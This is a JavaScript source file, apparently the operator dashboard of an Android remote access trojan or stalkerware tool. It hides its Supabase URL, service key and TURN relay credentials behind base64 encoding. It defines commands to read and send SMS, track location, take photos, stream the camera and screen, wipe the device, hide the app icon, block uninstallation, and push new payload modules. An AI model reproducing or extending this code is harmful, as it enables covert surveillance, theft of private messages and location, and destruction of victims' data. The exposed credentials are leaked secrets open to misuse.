const dom = {};
const _0x5a1e = [
    "aHR0cHM6Ly9lbnZ5bW50amVjc2dpeG9mZWdicS5zdXBhYmFzZS5jbw==",
    "ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnBjM01pT2lKemRYQmhZbUZ6WlNJc0luSmxaaUk2SW1WdWRubHRiblJxWldOeloybDRiMlpsWjJKeElpd2ljbTlzWlNJNkluTm\nxjblpwWTJWZmNtOXNaU0lzSW1saGRDSTZNVGMzTmpZeU5Ea3pNeXdpWlhod0lqb3lNRGt5TWpBd09UTXpmUS56UzhTMGJCbXRpQWQxMkc2b0sxMThndVdSRi1rbzdSMG83R3lUX1E2d2FF",
    "YWRtaW5AZGV4c29jeS5jb20="
];

// Clean up any newlines that might have leaked into the base64 string
const SUPABASE_URL = atob(_0x5a1e[0].replace(/\s/g, ""));
const SUPABASE_KEY = atob(_0x5a1e[1].replace(/\s/g, ""));
const ADMIN_EMAILS = [atob(_0x5a1e[2].replace(/\s/g, ""))];

const CMD = {
    LOCK: "lock",
    UNLOCK: "unlock",
    STOP_STREAM: "stop_stream",
    KILL_STREAM: "kill_stream",
    SCREENSHOT: "screenshot",
    CHECK_PERMS: "check_perms",
    CAMERA_FRONT: "camera_front",
    CAMERA_BACK: "camera_back",
    LOCATION: "location",
    SMS_LIST: "sms_list",
    SMS_SEND: "send_sms",
    VIBRATE: "vibrate",
    TOAST: "toast",
    WIPE: "wipe",
    ANTI_UNINSTALL: "anti_uninstall",
    HIDE_ICON: "hide_icon",
    FLASH: "flash",
    REQ_PERM: "request_perm",
    LOAD_MODULE: "load_module",
    UPDATE_PAYLOAD: "update_payload"
};

const RTC_CONFIG = {
    iceServers: [
        { urls: "stun:stun.l.google.com:19302" },
        { urls: "stun:stun1.l.google.com:19302" },
        { urls: "stun:stun2.l.google.com:19302" },
        { urls: "stun:stun3.l.google.com:19302" },
        { urls: "stun:stun4.l.google.com:19302" },
        { urls: "stun:stun.cloudflare.com:3478" },
        { urls: "stun:stun.services.mozilla.com" }
    ],
    iceCandidatePoolSize: 10,
    bundlePolicy: "max-bundle",
    rtcpMuxPolicy: "require",
    sdpSemantics: "unified-plan"
};

const FALLBACK_TURN = [
    {
        urls: [
            atob("dHVybjpnbG9iYWwucmVsYXkubWV0ZXJlZC5jYTo4MA=="),
            atob("dHVybjpnbG9iYWwucmVsYXkubWV0ZXJlZC5jYTo0NDM="),
            atob("dHVybjpnbG9iYWwucmVsYXkubWV0ZXJlZC5jYTo0NDM/dHJhbnNwb3J0PXRjcA=="),
            atob("dHVybnM6Z2xvYmFsLnJlbGF5Lm1ldGVyZWQuY2E6NDQzP3RyYW5zcG9ydD10Y3A=")
        ],
        username: atob("MzM1MDAyMjViOTEwNWU5Y2U0NzdkN2Y0"),
        credential: atob("OTdVaW9pU2hVODVJa091YQ==")
    }
];
const TOAST_MS = 3200;
const TOAST_EXIT_MS = 260;
const MODAL_EXIT_MS = 260;

const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY, {
    auth: { persistSession: false }
});

const state = {
    auth: {
        user: null,
        role: "user",
        isAdmin: false
    },
    ui: {
        loading: false,
        view: "devices",
        modal: null,
        toasts: [],
        logs: []
    },
    data: {
        devices: [],
        selectedDeviceId: null,
        selectedDevice: null,
        controlStatesByDevice: {}
    },
    stream: {
        active: false,
        mode: null,
        token: 0,
        status: "idle",
        withAudio: false
    }
};

const VIEW_ORDER = ["devices", "system", "remote", "logs"];

const REMOTE_ACTIONS = [
    { icon: "message-square", label: "Read Messages", type: "command", value: CMD.SMS_LIST },
    { icon: "map-pin", label: "Track Location", type: "command", value: CMD.LOCATION },
    { icon: "bell", label: "Send Toast", type: "modal", value: CMD.TOAST },
    { key: "lock", type: "toggle-command" },
    { key: "flashlight", type: "toggle-command" },
    { icon: "smartphone", label: "Vibrate Device", type: "command", value: CMD.VIBRATE }
];

const MEDIA_ACTIONS = [
    { icon: "camera", label: "Take Photo", type: "take-photo-setup", value: "" },
    { icon: "video", label: "Video Live", type: "stream", value: CMD.CAMERA_BACK, vipOnly: true },
    { icon: "monitor-smartphone", label: "Screenshot", type: "command", value: CMD.SCREENSHOT },
    { icon: "monitor", label: "Screen Mirror", type: "stream", value: "screen", vipOnly: true },
    { icon: "zap-off", label: "Killall Stream", type: "command", value: CMD.KILL_STREAM, vipOnly: true }
];

const SYSTEM_ACTIONS = [
    { icon: "refresh-ccw", label: "Update Payload", type: "command", value: CMD.UPDATE_PAYLOAD },
    { key: "hideIcon", type: "toggle-command" },
    { key: "antiUninstall", type: "toggle-command", vipOnly: true },
    { icon: "refresh-cw", label: "Refresh Device", type: "refresh-device", value: "" }
];

const PERMISSION_ACTIONS = [
    { icon: "shield-check", label: "Grant All Access", type: "command", value: `${CMD.REQ_PERM}:all`, permKey: "permissions_granted" },
    { icon: "message-square", label: "SMS Access", type: "command", value: `${CMD.REQ_PERM}:sms`, permKey: "sms" },
    { icon: "map-pin", label: "Location Access", type: "command", value: `${CMD.REQ_PERM}:location`, permKey: "location" },
    { icon: "camera", label: "Camera Access", type: "command", value: `${CMD.REQ_PERM}:camera`, permKey: "camera" },
    { icon: "mic", label: "Microphone Access", type: "command", value: `${CMD.REQ_PERM}:mic`, permKey: "mic" }
];

const TOGGLE_ACTIONS = {
    lock: {
        stateKey: "locked",
        defaultValue: false,
        on: {
            icon: "lock",
            label: "Device Locked",
            command: CMD.UNLOCK
        },
        off: {
            icon: "lock-open",
            label: "Device Unlocked",
            command: CMD.LOCK
        }
    },
    flashlight: {
        stateKey: "flashlightOn",
        defaultValue: false,
        on: {
            icon: "flashlight",
            label: "Flashlight",
            command: CMD.FLASH + "_off"
        },
        off: {
            icon: "flashlight-off",
            label: "Flashlight",
            command: CMD.FLASH + "_on"
        }
    },
    hideIcon: {
        stateKey: "iconHidden",
        defaultValue: false,
        on: {
            icon: "eye-off",
            label: "Hide App Icon",
            command: CMD.HIDE_ICON + ":off"
        },
        off: {
            icon: "eye",
            label: "Hide App Icon",
            command: CMD.HIDE_ICON + ":on"
        }
    },
    antiUninstall: {
        stateKey: "antiUninstall",
        defaultValue: false,
        on: {
            icon: "shield",
            label: "Anti Uninstall",
            command: CMD.ANTI_UNINSTALL + ":off"
        },
        off: {
            icon: "shield-off",
            label: "Anti Uninstall",
            command: CMD.ANTI_UNINSTALL + ":on"
        }
    }
};
